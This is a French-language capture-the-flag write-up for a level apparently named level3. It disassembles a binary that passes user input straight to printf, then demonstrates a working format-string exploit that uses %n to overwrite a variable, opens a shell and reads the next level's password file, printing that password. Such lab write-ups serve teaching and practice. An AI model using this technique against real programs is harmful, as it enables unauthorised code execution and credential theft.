#	Au level 3 nous avons un executable qui lis dans l'entree standard.

#	Voyons au niveau du code: 

$> objdump -d ./level3
[...]
080484a4 <v>:
 80484a4:	55                   	push   %ebp
 80484a5:	89 e5                	mov    %esp,%ebp
 80484a7:	81 ec 18 02 00 00    	sub    $0x218,%esp			<-- allocation de 536
 80484ad:	a1 60 98 04 08       	mov    0x8049860,%eax
 80484b2:	89 44 24 08          	mov    %eax,0x8(%esp)		<-- 3eme arg de fgets = stdin
 80484b6:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp)		<-- 2eme arg de fgets = 512
 80484bd:	00
 80484be:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax	<-- buff[520]
 80484c4:	89 04 24             	mov    %eax,(%esp)
 80484c7:	e8 d4 fe ff ff       	call   80483a0 <fgets@plt>	<-- fgets(buff, 512, stdin)
 80484cc:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 80484d2:	89 04 24             	mov    %eax,(%esp)
 80484d5:	e8 b6 fe ff ff       	call   8048390 <printf@plt>	<-- printf(buff)
 80484da:	a1 8c 98 04 08       	mov    0x804988c,%eax		<-- recupere une variable sur la stack
 80484df:	83 f8 40             	cmp    $0x40,%eax			<-- et la compare avec 0x40(64)
 80484e2:	75 34                	jne    8048518 <v+0x74>		<-- si different jmp au return
 80484e4:	a1 80 98 04 08       	mov    0x8049880,%eax		<-- sinon ca viendra faire un write suivi d'un system("/bin/sh")
 80484e9:	89 c2                	mov    %eax,%edx
 80484eb:	b8 00 86 04 08       	mov    $0x8048600,%eax
 80484f0:	89 54 24 0c          	mov    %edx,0xc(%esp)
 80484f4:	c7 44 24 08 0c 00 00 	movl   $0xc,0x8(%esp)
 80484fb:	00
 80484fc:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
 8048503:	00
 8048504:	89 04 24             	mov    %eax,(%esp)
 8048507:	e8 a4 fe ff ff       	call   80483b0 <fwrite@plt>
 804850c:	c7 04 24 0d 86 04 08 	movl   $0x804860d,(%esp)
 8048513:	e8 a8 fe ff ff       	call   80483c0 <system@plt>
 8048518:	c9                   	leave
 8048519:	c3                   	ret

0804851a <main>:
 804851a:	55                   	push   %ebp
 804851b:	89 e5                	mov    %esp,%ebp
 804851d:	83 e4 f0             	and    $0xfffffff0,%esp
 8048520:	e8 7f ff ff ff       	call   80484a4 <v>			<-- v()
 8048525:	c9                   	leave
 8048526:	c3                   	ret
 8048527:	90                   	nop
 8048528:	90                   	nop
 8048529:	90                   	nop
 804852a:	90                   	nop
 804852b:	90                   	nop
 804852c:	90                   	nop
 804852d:	90                   	nop
 804852e:	90                   	nop
 804852f:	90                   	nop
[...]

#	On voit rapidement que le but va etre de rentrer dans le if qui lance un shell. Cependant cette fois ci nous utilisons fgets qui n'est pas sensible au buffer overflow..
#	Par contre, on voit une utilisation inhabituelle de printf qui semble causer un probleme de securite, la "Format String Attack".

#	Lorsque l'on utilise printf, nous devons specifier quel type de valeur nous voulons afficher grace a les parametres %d %s %x %p etc... ces parametres pointeront sur un element specifique de la stack et l'affichera.

#	Cependant ici aucun formatage n'est utilise et la string est directement placee en parametre. Ce qui signifie que nous pouvons passer des parametres de formatage directement dans le buffer et ils seront interpretes comme tel par printf, exemple:

$> ./level3
%s
Segmentation fault (core dumped)

#	Ici j'ai voulu afficher une string, cependant, celle ci ne pointant vers aucune adresse, le programme va segfault. Passons a un exemple plus interessant:

$> ./level3
%08x %08x %08x %08x %08x %08x
00000200 b7fd1ac0 b7ff37d0 78383025 38302520 30252078

#	Ici j'ai voulu afficher des valeurs sur la stack. Etant donne qu'ils n'ont pas d'arguments ils afficheront directement les valeurs dans l'ordre de la stack. Voila une fuite de donnee.

#	Maintenant nous allons essayer de trouver ou est le buffer sur la stack par une manipulation simple:

$> ./level3
AAAA %08x %08x %08x %08x %08x %08x
AAAA 00000200 b7fd1ac0 b7ff37d0 41414141 38302520 30252078

#	En ecrivant AAAA au debut du buffer on peux voir que l'on a modifie le 4eme element de la stack
#	Mais on peux faire beaucoup mieux, avec l'element %n on peux directement ecrire une valeur a l'adresse specifie avant %n, dans notre cas nous voulons ecrire 64 a l'adresse 0x804988c. On va donc ecrire cette adresse dans le buffer, %n ecrit le nombre de byte ecris avant son appel, il faudra donc ajouter un padding de 60 (60 + taille de l'adresse = 64) puis lui specifier la position du buffer sur la stack afin qui aille ecrire 64 dans l'adresse precisee dans le buffer:

$> (python -c "print '\x8c\x98\x04\x08' + 60*'a' + '%4\$n'"; cat -) | ./level3
ï¿½aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

#	L'element %4$ permet de specifier la position de l'argument, ici on sait que notre buffer est la 4eme position sur la stack

